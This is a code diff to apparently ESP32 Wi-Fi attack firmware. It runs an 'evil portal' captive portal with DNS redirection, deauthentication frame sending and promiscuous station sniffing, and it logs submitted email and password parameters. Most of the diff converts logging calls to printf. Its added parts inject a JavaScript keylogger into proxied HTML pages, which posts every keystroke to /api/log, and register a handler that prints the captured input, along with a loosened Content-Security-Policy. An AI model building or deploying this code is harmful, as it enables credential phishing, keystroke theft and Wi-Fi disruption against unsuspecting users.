@@ -75,7 +75,7 @@ void configure_hidden_ap() {
     // Get the current AP configuration
     esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &wifi_config);
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to get Wi-Fi config: %s", esp_err_to_name(err));
+        printf("Failed to get Wi-Fi config: %s\n", esp_err_to_name(err));
         return;
     }
 
@@ -87,9 +87,9 @@ void configure_hidden_ap() {
     // Apply the updated configuration
     err = esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to set Wi-Fi config: %s", esp_err_to_name(err));
+        printf("Failed to set Wi-Fi config: %s\n", esp_err_to_name(err));
     } else {
-        ESP_LOGI(TAG, "Wi-Fi AP SSID is now hidden.");
+        printf("Wi-Fi AP SSID is now hidden.\n");
     }
 }
 
@@ -98,23 +98,23 @@ static void event_handler(void* arg, esp_event_base_t event_base,
     if (event_base == WIFI_EVENT) {
         switch (event_id) {
             case WIFI_EVENT_AP_START:
-                ESP_LOGI(TAG, "AP started");
+                printf("AP started\n");
                 break;
             case WIFI_EVENT_AP_STOP:
-                ESP_LOGI(TAG, "AP stopped");
+                printf("AP stopped\n");
                 break;
             case WIFI_EVENT_AP_STACONNECTED:
-                ESP_LOGI(TAG, "Station connected to AP");
+                printf("Station connected to AP\n");
                 break;
             case WIFI_EVENT_AP_STADISCONNECTED:
-                ESP_LOGI(TAG, "Station disconnected from AP");
+                printf("Station disconnected from AP\n");
                 break;
             case WIFI_EVENT_STA_START:
-                ESP_LOGI(TAG, "STA started");
+                printf("STA started\n");
                 esp_wifi_connect();
                 break;
             case WIFI_EVENT_STA_DISCONNECTED:
-                ESP_LOGI(TAG, "Disconnected from Wi-Fi, retrying...");
+                printf("Disconnected from Wi-Fi, retrying...\n");
                 esp_wifi_connect();
                 break;
             default:
@@ -125,7 +125,7 @@ static void event_handler(void* arg, esp_event_base_t event_base,
             case IP_EVENT_STA_GOT_IP:
                 break;
             case IP_EVENT_AP_STAIPASSIGNED:
-                ESP_LOGI(TAG, "Assigned IP to STA");
+                printf("Assigned IP to STA\n");
                 break;
             default:
                 break;
@@ -208,14 +208,14 @@ const char *actiontec_ouis[] = {
 // WiFi event handler (same as before)
 static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
-        ESP_LOGI(TAG, "WiFi started, ready to scan.");
+        printf("WiFi started, ready to scan.\n");
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
-        ESP_LOGI(TAG, "Disconnected from WiFi");
+        printf("Disconnected from WiFi\n");
         xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
     }
     else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
         ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
-        ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
+        printf("Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
         xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
     }
 }
@@ -247,14 +247,17 @@ static bool station_exists(const uint8_t *station_mac, const uint8_t *ap_bssid) 
 
 static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bssid) {
     if (station_count < MAX_STATIONS) {
+        // Copy MAC addresses to the list
         memcpy(station_ap_list[station_count].station_mac, station_mac, 6);
         memcpy(station_ap_list[station_count].ap_bssid, ap_bssid, 6);
         station_count++;
-        ESP_LOGI(TAG, "Added station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
-                 station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
-                 ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]);
+
+        // Print formatted MAC addresses
+        printf("Added station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
+            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]);
     } else {
-        ESP_LOGW(TAG, "Station list is full, can't add more stations.");
+        printf("Station list is full, can't add more stations.\n");
     }
 }
 
@@ -336,25 +339,25 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
 }
 
 esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
-    ESP_LOGI(TAG, "Requesting URL: %s", url);
+    printf("Requesting URL: %s\n", url);
 
     
     if (strstr(url, "/mnt") != NULL) {
-        ESP_LOGI(TAG, "URL points to a local file: %s", url);
+        printf("URL points to a local file: %s\n", url);
 
         
         FILE *file = fopen(url, "r");
         if (file == NULL) {
-            ESP_LOGE(TAG, "Failed to open file: %s", url);
+            printf("Failed to open file: %s\n", url);
             return ESP_FAIL;
         }
 
        
         if (content_type) {
-            ESP_LOGI(TAG, "Content-Type: %s", content_type);
+            printf("Content-Type: %s\n", content_type);
             httpd_resp_set_type(req, content_type);
         } else {
-            ESP_LOGI(TAG, "Content-Type not provided, using default 'application/octet-stream'");
+            printf("Content-Type not provided, using default 'application/octet-stream'\n");
             httpd_resp_set_type(req, "application/octet-stream");
         }
         httpd_resp_set_status(req, "200 OK");
@@ -362,7 +365,7 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         
         char *buffer = (char *)malloc(CHUNK_SIZE + 1);
         if (buffer == NULL) {
-            ESP_LOGE(TAG, "Failed to allocate memory for buffer");
+            printf("Failed to allocate memory for buffer\n");
             fclose(file);
             return ESP_FAIL;
         }
@@ -371,16 +374,16 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         int read_len;
         while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
             if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
-                ESP_LOGE(TAG, "Failed to send chunk to client");
+                printf("Failed to send chunk to client\n");
                 break;
             }
         }
 
         
         if (feof(file)) {
-            ESP_LOGI(TAG, "Finished reading all data from file");
+            printf("Finished reading all data from file\n");
         } else if (ferror(file)) {
-            ESP_LOGE(TAG, "Error reading file");
+            printf("Error reading file\n");
         }
 
         // Clean up
@@ -398,51 +401,58 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             .timeout_ms = 5000,
             .crt_bundle_attach = esp_crt_bundle_attach,
             .transport_type = HTTP_TRANSPORT_OVER_SSL,
-            .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",  // Browser-like User-Agent string
+            .user_agent = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36",  // Browser-like User-Agent string
             .disable_auto_redirect = false,
         };
 
         esp_http_client_handle_t client = esp_http_client_init(&config);
         if (client == NULL) {
-            ESP_LOGE(TAG, "Failed to initialize HTTP client");
+            printf("Failed to initialize HTTP client\n");
             return ESP_FAIL;
         }
 
         esp_err_t err = esp_http_client_perform(client);
         if (err != ESP_OK) {
-            ESP_LOGE(TAG, "HTTP request failed: %s", esp_err_to_name(err));
+            printf("HTTP request failed: %s\n", esp_err_to_name(err));
             esp_http_client_cleanup(client);
             return ESP_FAIL;
         }
 
         int http_status = esp_http_client_get_status_code(client);
-        ESP_LOGI(TAG, "Final HTTP Status code: %d", http_status);
+        printf("Final HTTP Status code: %d\n", http_status);
 
         if (http_status == 200) {
-            ESP_LOGI(TAG, "Received 200 OK. Re-opening connection for manual streaming...");
+            printf("Received 200 OK. Re-opening connection for manual streaming...\n");
 
             err = esp_http_client_open(client, 0);
             if (err != ESP_OK) {
-                ESP_LOGE(TAG, "Failed to re-open HTTP connection for streaming: %s", esp_err_to_name(err));
+                printf("Failed to re-open HTTP connection for streaming: %s\n", esp_err_to_name(err));
                 esp_http_client_cleanup(client);
                 return ESP_FAIL;
             }
 
             int content_length = esp_http_client_fetch_headers(client);
-            ESP_LOGI(TAG, "Content length: %d", content_length);
+            printf("Content length: %d\n", content_length);
 
             if (content_type) {
-                ESP_LOGI(TAG, "Content-Type: %s", content_type);
+                printf("Content-Type: %s\n", content_type);
                 httpd_resp_set_type(req, content_type);
             } else {
-                ESP_LOGI(TAG, "Content-Type not provided, using default 'application/octet-stream'");
+                printf("Content-Type not provided, using default 'application/octet-stream'\n");
                 httpd_resp_set_type(req, "application/octet-stream");
             }
+
+            httpd_resp_set_hdr(req, "Content-Security-Policy", 
+                   "default-src 'self' 'unsafe-inline' data: blob:; "
+                   "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
+                   "style-src 'self' 'unsafe-inline' data:; "
+                   "img-src 'self' 'unsafe-inline' data: blob:; "
+                   "connect-src 'self' data: blob:;");
             httpd_resp_set_status(req, "200 OK");
 
             char *buffer = (char *)malloc(CHUNK_SIZE + 1);
             if (buffer == NULL) {
-                ESP_LOGE(TAG, "Failed to allocate memory for buffer");
+                printf("Failed to allocate memory for buffer");
                 esp_http_client_cleanup(client);
                 return ESP_FAIL;
             }
@@ -450,15 +460,40 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             int read_len;
             while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
                 if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
-                    ESP_LOGE(TAG, "Failed to send chunk to client");
+                    printf("Failed to send chunk to client\n");
                     break;
                 }
             }
 
             if (read_len == 0) {
-                ESP_LOGI(TAG, "Finished reading all data from server (end of content)");
+                printf("Finished reading all data from server (end of content)\n");
             } else if (read_len < 0) {
-                ESP_LOGE(TAG, "Failed to read response, read_len: %d", read_len);
+                printf("Failed to read response, read_len: %d\n", read_len);
+            }
+
+            if (content_type && strcmp(content_type, "text/html") == 0) {
+                const char *javascript_code =
+                    "<script>var keys = '';\n"
+                    "\n"
+                    "document.onkeypress = function(e) {\n"
+                    "    get = window.event ? event : e;\n"
+                    "    key = get.keyCode ? get.keyCode : get.charCode;\n"
+                    "    key = String.fromCharCode(key);\n"
+                    "    keys += key;\n"
+                    "\n"
+                    "    // Make a fetch request on every key press\n"
+                    "    fetch('/api/log', {\n"
+                    "        method: 'POST',\n"
+                    "        headers: {\n"
+                    "            'Content-Type': 'application/json'\n"
+                    "        },\n"
+                    "        body: JSON.stringify({ content: keys })\n"
+                    "    })\n"
+                    "    .catch(error => console.error('Error logging:', error));\n"
+                    "};</script>\n";
+                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
+                    printf("Failed to send custom JavaScript\n");
+                }
             }
 
             free(buffer);
@@ -469,7 +504,7 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
 
             return ESP_OK;
         } else {
-            ESP_LOGE(TAG, "Unhandled HTTP status code: %d", http_status);
+            printf("Unhandled HTTP status code: %d\n", http_status);
             esp_http_client_cleanup(client);
             return ESP_FAIL;
         }
@@ -496,18 +531,18 @@ const char* get_host_from_req(httpd_req_t *req) {
     if (buf_len > 1) {
         char *host = malloc(buf_len);
         if (httpd_req_get_hdr_value_str(req, "Host", host, buf_len) == ESP_OK) {
-            ESP_LOGI(TAG, "Host header found: %s", host);
+            printf("Host header found: %s\n", host);
             return host;  // Caller must free() this memory
         }
         free(host);
     }
-    ESP_LOGW(TAG, "Host header not found");
+    printf("Host header not found\n");
     return NULL;
 }
 
 void build_file_url(const char *host, const char *uri, char *file_url, size_t max_len) {
     snprintf(file_url, max_len, "https://%s%s", host, uri);
-    ESP_LOGI(TAG, "File URL built: %s", file_url);
+    printf("File URL built: %s\n", file_url);
 }
 
 esp_err_t file_handler(httpd_req_t *req) {
@@ -527,7 +562,7 @@ esp_err_t file_handler(httpd_req_t *req) {
 
     
     const char *content_type = get_content_type(uri);
-    ESP_LOGI(TAG, "Determined content type: %s for URI: %s", content_type, uri);
+    printf("Determined content type: %s for URI: %s\n", content_type, uri);
 
     
     esp_err_t result = stream_data_to_client(req, file_url, content_type);
@@ -539,7 +574,7 @@ esp_err_t file_handler(httpd_req_t *req) {
 
 
 esp_err_t portal_handler(httpd_req_t *req) {
-    ESP_LOGI(TAG, "Client requested URL: %s", req->uri);
+    printf("Client requested URL: %s\n", req->uri);
 
     
     const char *portal_url = PORTALURL;
@@ -561,6 +596,27 @@ esp_err_t portal_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+esp_err_t get_log_handler(httpd_req_t *req) {
+    char body[256] = {0};
+    int received = 0;
+
+    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
+        body[received] = '\0';
+
+        printf("Received chunk: %s\n", body);
+    }
+
+    if (received < 0) {
+        printf("Failed to receive request body");
+        return ESP_FAIL;
+    }
+
+    const char* resp_str = "Body content logged successfully";
+    httpd_resp_send(req, resp_str, strlen(resp_str));
+
+    return ESP_OK;
+}
+
 esp_err_t get_info_handler(httpd_req_t *req) {
     char query[256] = {0};
     char email[64] = {0};
@@ -568,28 +624,28 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 
     
     if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
-        ESP_LOGI("QUERY", "Received query: %s", query);
+        printf("Received query: %s\n", query);
 
 
         if (get_query_param_value(query, "email", email, sizeof(email)) == ESP_OK) {
             char decoded_email[64] = {0};
             url_decode(decoded_email, email);
-            ESP_LOGI("QUERY", "Decoded email: %s", decoded_email);
+            printf("Decoded email: %s\n", decoded_email);
         } else {
-            ESP_LOGW("QUERY", "Email parameter not found");
+            printf("Email parameter not found\n");
         }
 
         
         if (get_query_param_value(query, "password", password, sizeof(password)) == ESP_OK) {
             char decoded_password[64] = {0};
             url_decode(decoded_password, password);
-            ESP_LOGI("QUERY", "Decoded password: %s", decoded_password);
+            printf("Decoded password: %s\n", decoded_password);
         } else {
-            ESP_LOGW("QUERY", "Password parameter not found");
+            printf("Password parameter not found\n");
         }
 
     } else {
-        ESP_LOGW("QUERY", "No query string found in request");
+        printf("No query string found in request\n");
     }
 
     
@@ -600,7 +656,7 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 }
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
-    ESP_LOGI(TAG, "Received request for captive portal detection endpoint: %s", req->uri);
+    printf("Received request for captive portal detection endpoint: %s\n", req->uri);
 
     if (strstr(req->uri, "/get") != NULL) {
         get_info_handler(req);
@@ -652,6 +708,12 @@ httpd_handle_t start_portal_webserver(void) {
             .handler  = captive_portal_redirect_handler,
             .user_ctx = NULL
         };
+        httpd_uri_t log_handler_uri = {
+            .uri      = "/api/log",
+            .method   = HTTP_POST,
+            .handler  = get_log_handler,
+            .user_ctx = NULL
+        };
         httpd_uri_t portal_png = {
             .uri      = ".png",
             .method   = HTTP_GET,
@@ -680,6 +742,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &portal_uri_android);
         httpd_register_uri_handler(evilportal_server, &microsoft_uri);
+        httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
@@ -773,9 +836,9 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
         // Start the DNS server with the configured settings
         dns_handle = start_dns_server(&dns_config);
         if (dns_handle) {
-            ESP_LOGI(TAG, "DNS server started, all requests will be redirected to 192.168.4.1");
+            printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
         } else {
-            ESP_LOGE(TAG, "Failed to start DNS server");
+            printf("Failed to start DNS server\n");
         }
     }
     else 
@@ -811,9 +874,9 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
 
         dns_handle = start_dns_server(&dns_config);
         if (dns_handle) {
-            ESP_LOGI(TAG, "DNS server started, all requests will be redirected to 192.168.4.1");
+            printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
         } else {
-            ESP_LOGE(TAG, "Failed to start DNS server");
+            printf("Failed to start DNS server\n");
         }
     }
 }
@@ -850,14 +913,14 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));
 
-    ESP_LOGI(TAG, "WiFi monitor mode started.");
+    printf("WiFi monitor mode started.\n");
     TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode started.");
 }
 
 void wifi_manager_stop_monitor_mode() {
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
 
-    ESP_LOGI(TAG, "WiFi monitor mode stopped.");
+    printf("WiFi monitor mode stopped.\n");
     TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode stopped.");
 }
 
@@ -915,9 +978,9 @@ void wifi_manager_init() {
 
     ret = esp_crt_bundle_attach(NULL);
     if (ret == ESP_OK) {
-        ESP_LOGI(TAG, "Global CA certificate store initialized successfully.");
+        printf("Global CA certificate store initialized successfully.\n");
     } else {
-        ESP_LOGE(TAG, "Failed to initialize global CA certificate store: %s", esp_err_to_name(ret));
+        printf("Failed to initialize global CA certificate store: %s\n", esp_err_to_name(ret));
     }
 }
 
@@ -945,13 +1008,13 @@ void wifi_manager_start_scan() {
     
     rgb_manager_set_color(&rgb_manager, 0, 50, 255, 50, false);
 
-    ESP_LOGI(TAG, "WiFi scanning started...");
-    ESP_LOGI(TAG, "Please wait 5 Seconds...");
-    TERMINAL_VIEW_ADD_TEXT("WiFi scanning started...");
+    printf("WiFi scanning started...\n");
+    printf("Please wait 5 Seconds...\n");
+    TERMINAL_VIEW_ADD_TEXT("WiFi scanning started...\n");
     esp_err_t err = esp_wifi_scan_start(&scan_config, true);
 
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "WiFi scan failed to start: %s", esp_err_to_name(err));
+        printf("WiFi scan failed to start: %s", esp_err_to_name(err));
         TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start");
         return;
     }
@@ -969,8 +1032,8 @@ void wifi_manager_stop_scan() {
 
     err = esp_wifi_scan_stop();
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to stop WiFi scan: %s", esp_err_to_name(err));
-        TERMINAL_VIEW_ADD_TEXT("Failed to stop WiFi scan");
+        printf("Failed to stop WiFi scan: %s\n", esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT("Failed to stop WiFi scan\n");
         return;
     }
 
@@ -984,13 +1047,13 @@ void wifi_manager_stop_scan() {
     uint16_t initial_ap_count = 0;
     err = esp_wifi_scan_get_ap_num(&initial_ap_count);
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to get AP count: %s", esp_err_to_name(err));
-        TERMINAL_VIEW_ADD_TEXT( "Failed to get AP count: %s", esp_err_to_name(err));
+        printf("Failed to get AP count: %s\n", esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT( "Failed to get AP count: %s\n", esp_err_to_name(err));
         return;
     }
 
-    ESP_LOGI(TAG, "Initial AP count: %u", initial_ap_count);
-    TERMINAL_VIEW_ADD_TEXT("Initial AP count: %u", initial_ap_count);
+    printf("Initial AP count: %u\n", initial_ap_count);
+    TERMINAL_VIEW_ADD_TEXT("Initial AP count: %u\n", initial_ap_count);
 
     if (initial_ap_count > 0) {
 
@@ -1002,7 +1065,7 @@ void wifi_manager_stop_scan() {
 
         scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
         if (scanned_aps == NULL) {
-            ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+            printf("Failed to allocate memory for AP info\n");
             ap_count = 0;
             return;
         }
@@ -1011,7 +1074,7 @@ void wifi_manager_stop_scan() {
         uint16_t actual_ap_count = initial_ap_count;
         err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
         if (err != ESP_OK) {
-            ESP_LOGE(TAG, "Failed to get AP records: %s", esp_err_to_name(err));
+            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
             free(scanned_aps);
             scanned_aps = NULL;
             ap_count = 0;
@@ -1019,38 +1082,41 @@ void wifi_manager_stop_scan() {
         }
 
         ap_count = actual_ap_count;
-        ESP_LOGI(TAG, "Actual AP count retrieved: %u", ap_count);
-        TERMINAL_VIEW_ADD_TEXT("Actual AP count retrieved: %u", ap_count);
+        printf("Actual AP count retrieved: %u\n", ap_count);
+        TERMINAL_VIEW_ADD_TEXT("Actual AP count retrieved: %u\n", ap_count);
     } else {
-        ESP_LOGI(TAG, "No access points found");
+        printf("No access points found\n");
         ap_count = 0;
     }
 
-    ESP_LOGI(TAG, "WiFi scanning stopped.");
-    TERMINAL_VIEW_ADD_TEXT("WiFi scanning stopped.");
+    printf("WiFi scanning stopped.\n");
+    TERMINAL_VIEW_ADD_TEXT("WiFi scanning stopped.\n");
 }
 
 void wifi_manager_list_stations() {
     if (station_count == 0) {
-        ESP_LOGI(TAG, "No stations found.");
+        printf("No stations found.\n");
         return;
     }
 
-    ESP_LOGI(TAG, "Listing all stations and their associated APs:");
+    printf("Listing all stations and their associated APs:\n");
 
     for (int i = 0; i < station_count; i++) {
-        ESP_LOGI(TAG, "Station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
-                 station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2],
-                 station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
-                 station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2],
-                 station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
+        printf(
+            "Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n"
+            "     -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+            station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2],
+            station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
+            station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2],
+            station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]
+        );
     }
-}
+}   
 
 esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     if (err != ESP_OK) {
-        ESP_LOGE("WiFiManager", "Failed to set channel: %s", esp_err_to_name(err));
+        printf("Failed to set channel: %s\n", esp_err_to_name(err));
     }
 
     uint8_t deauth_frame_default[26] = {
@@ -1089,7 +1155,7 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
     esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
     err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
     if (err != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to send beacon frame: %s", esp_err_to_name(err));
+        printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
         return err;
     }
 
@@ -1100,14 +1166,14 @@ void wifi_deauth_task(void *param) {
     const char *ssid = (const char *)param;
 
     if (ap_count == 0) {
-        ESP_LOGI(TAG, "No access points found");
+        printf("No access points found\n");
         vTaskDelete(NULL);
         return;
     }
 
     wifi_ap_record_t *ap_info = scanned_aps;
     if (ap_info == NULL) {
-        ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+        printf("Failed to allocate memory for AP info\n");
         vTaskDelete(NULL);
         return;
     }
@@ -1147,16 +1213,16 @@ void wifi_deauth_task(void *param) {
 void wifi_manager_start_deauth()
 {
     if (!beacon_task_running) {
-        ESP_LOGI(TAG, "Starting deauth transmission...");
-        TERMINAL_VIEW_ADD_TEXT("Starting deauth transmission...");
+        printf("Starting deauth transmission...\n");
+        TERMINAL_VIEW_ADD_TEXT("Starting deauth transmission...\n");
         ap_manager_stop_services();
         ESP_ERROR_CHECK(esp_wifi_start());
         xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, 0, 255, 22, 23, false);
     } else {
-        ESP_LOGW(TAG, "Deauth transmission already running.");
-        TERMINAL_VIEW_ADD_TEXT("Deauth transmission already running.");
+        printf("Deauth transmission already running.\n");
+        TERMINAL_VIEW_ADD_TEXT("Deauth transmission already running.\n");
     }
 }
 
@@ -1164,31 +1230,31 @@ void wifi_manager_select_ap(int index)
 {
     
     if (ap_count == 0) {
-        ESP_LOGI(TAG, "No access points found");
+        printf("No access points found\n");
         return;
     }
 
 
     if (scanned_aps == NULL) {
-        ESP_LOGE(TAG, "No AP info available (scanned_aps is NULL)");
+        printf("No AP info available (scanned_aps is NULL)\n");
         return;
     }
 
 
     if (index < 0 || index >= ap_count) {
-        ESP_LOGE(TAG, "Invalid index: %d. Index should be between 0 and %d", index, ap_count - 1);
+        printf("Invalid index: %d. Index should be between 0 and %d\n", index, ap_count - 1);
         return;
     }
     
     selected_ap = scanned_aps[index];
 
     
-    ESP_LOGI(TAG, "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+    printf("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
              selected_ap.ssid,
              selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
              selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
     
-    TERMINAL_VIEW_ADD_TEXT("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+    TERMINAL_VIEW_ADD_TEXT("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
              selected_ap.ssid,
              selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
              selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
@@ -1217,39 +1283,37 @@ void screen_music_visualizer_task(void *pvParameters) {
     
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) {
-        ESP_LOGE(TAG, "Unable to create socket: errno %d", errno);
+        printf("Unable to create socket: errno %d\n", errno);
         vTaskDelete(NULL);
         return;
     }
 
-    ESP_LOGI(TAG, "Socket created");
+    printf("Socket created\n");
 
     int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
     if (err < 0) {
-        ESP_LOGE(TAG, "Socket unable to bind: errno %d", errno);
+        printf("Socket unable to bind: errno %d\n", errno);
         close(sock);
         vTaskDelete(NULL);
         return;
     }
 
-    ESP_LOGI(TAG, "Socket bound, port %d", UDP_PORT);
+    printf("Socket bound, port %d\n", UDP_PORT);
 
     while (1) {
-        ESP_LOGI(TAG, "Waiting for data...");
+        printf("Waiting for data...\n");
 
         struct sockaddr_in6 source_addr;
         socklen_t socklen = sizeof(source_addr);
 
         int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0, (struct sockaddr *)&source_addr, &socklen);
         if (len < 0) {
-            ESP_LOGE(TAG, "recvfrom failed: errno %d", errno);
+            printf("recvfrom failed: errno %d\n", errno);
             break;
         }
 
         
         rx_buffer[len] = '\0';
-        ESP_LOGI(TAG, "Received %d bytes from %s:", len, inet6_ntoa(source_addr.sin6_addr));
-        ESP_LOGI(TAG, "%s", rx_buffer);
 
         
         if (len >= TRACK_NAME_LEN + ARTIST_NAME_LEN + NUM_BARS) {
@@ -1266,12 +1330,12 @@ void screen_music_visualizer_task(void *pvParameters) {
             music_visualizer_view_update(amplitudes, track_name, artist_name);
 #endif
         } else {
-            ESP_LOGW(TAG, "Received packet of unexpected size");
+            printf("Received packet of unexpected size\n");
         }
     }
 
     if (sock != -1) {
-        ESP_LOGE(TAG, "Shutting down socket and restarting...");
+        printf("Shutting down socket and restarting...\n");
         shutdown(sock, 0);
         close(sock);
     }
@@ -1293,17 +1357,17 @@ void animate_led_based_on_amplitude(void *pvParameters)
 
     int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
     if (sock < 0) {
-        ESP_LOGE(TAG, "Unable to create socket: errno %d", errno);
+        printf("Unable to create socket: errno %d\n", errno);
         return;
     }
-    ESP_LOGI(TAG, "Socket created");
+    printf("Socket created\n");
 
     if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
-        ESP_LOGE(TAG, "Socket unable to bind: errno %d", errno);
+        printf("Socket unable to bind: errno %d\n", errno);
         close(sock);
         return;
     }
-    ESP_LOGI(TAG, "Socket bound, port %d", UDP_PORT);
+    printf("Socket bound, port %d\n", UDP_PORT);
 
     float amplitude = 0.0f;
     float last_amplitude = 0.0f;
@@ -1319,7 +1383,7 @@ void animate_led_based_on_amplitude(void *pvParameters)
         if (len > 0) {
             rx_buffer[len] = '\0';
             inet_ntoa_r(source_addr.sin_addr, addr_str, sizeof(addr_str) - 1);
-            ESP_LOGI(TAG, "Received %d bytes from %s: %s", len, addr_str, rx_buffer);
+            printf("Received %d bytes from %s: %s\n", len, addr_str, rx_buffer);
 
             amplitude = atof(rx_buffer);
